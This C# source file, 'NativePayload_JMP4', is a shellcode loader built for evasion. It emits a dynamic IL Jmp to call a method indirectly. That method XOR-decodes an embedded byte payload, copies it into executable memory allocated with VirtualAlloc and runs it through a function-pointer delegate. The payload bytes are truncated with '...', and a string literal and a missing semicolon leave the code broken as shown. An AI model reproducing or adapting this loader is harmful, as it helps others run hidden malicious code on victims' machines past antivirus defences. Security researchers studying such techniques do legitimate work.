using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;

using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace NativePayload_JMP4
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_JMP4 , Published by Damon Mohammadbagher , 2023");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_JMP4 Emit JMP Method + Indirect Invoke C# Method");
            Console.WriteLine();
            // Create a dynamic assembly with one module
            AssemblyName assemblyName = new AssemblyName("DynamicAssembly");
            AssemblyBuilder assemblyBuilder = 
                AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");
            // Define a public class named "Jumper"
            TypeBuilder typeBuilder = moduleBuilder.DefineType("Jumper", TypeAttributes.Public);
            // Define a public static method named "JumpTo" that takes no parameters and returns void
            MethodBuilder jumpToMethod = typeBuilder.DefineMethod("JumpTo", 
                MethodAttributes.Public | MethodAttributes.Static, typeof(void), Type.EmptyTypes);
            // Get the IL generator for the "JumpTo" method
            ILGenerator ilGenerator = jumpToMethod.GetILGenerator(); 
            MethodInfo IndirectCall_TargetMethod = typeof(Program).GetMethod("ExecuteInmemory");
            Console.WriteLine("[!] Setting up Target C# Method [ExecuteInmemory] with Method handle to Jump, 
IndirectCall_TargetMethod.MethodHandle.Value.Result[" +
               IndirectCall_TargetMethod.MethodHandle.Value.ToString("X8") + "]");
            // Emit the OpCode.Jmp instruction with the methodinfo
            ilGenerator.Emit(OpCodes.Jmp, IndirectCall_TargetMethod);
            // Create the "Jumper" type
            Type jumperType = typeBuilder.CreateType();
            // Invoke the "JumpTo" method
            jumperType.InvokeMember("JumpTo", BindingFlags.InvokeMethod 
                | BindingFlags.Public | BindingFlags.Static, null, null, null);  
        }
        
        public static void ExecuteInmemory()
        {
            string Payload_Encrypted = "236 88 147 244 224 248 216 16 16 16 81 65 81 64 66 65 70 88..."
            string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(' ');
            byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
            for (int i = 0; i < Payload_Encrypted_Without_delimiterChar.Length; i++)
            {
                byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
                _X_to_Bytes[i] = current;
            }
            byte[] Xpayload = Xor(_X_to_Bytes, new byte[] { 0x10 });
            /// Alocate Memory space for payload          
            IntPtr AddressOfPayload_In_Mem = VirtualAlloc(IntPtr.Zero, (uint)Xpayload.Length, 0x1000, 0x40);
            Console.WriteLine("[!] New Memory Space, VirtualAlloc with StartAddress VirtualAlloc.Result[" + 
                AddressOfPayload_In_Mem.ToString("X8") + "]");
            Marshal.Copy(Xpayload, 0, (IntPtr)AddressOfPayload_In_Mem, Xpayload.Length);           
            Delegate TechniqueD = (Action)Marshal.GetDelegateForFunctionPointer(AddressOfPayload_In_Mem, typeof(Action));
            Console.WriteLine("[>] calling Funtion Pointer with Address  TechniqueD.Method.MethodHandle.GetFunctionPointer().Result[" +
                TechniqueD.Method.MethodHandle.GetFunctionPointer().ToString("X8") + "]");
            TechniqueD.DynamicInvoke();

        }
       
        public static byte[] Xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }
            return xored;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    }
}
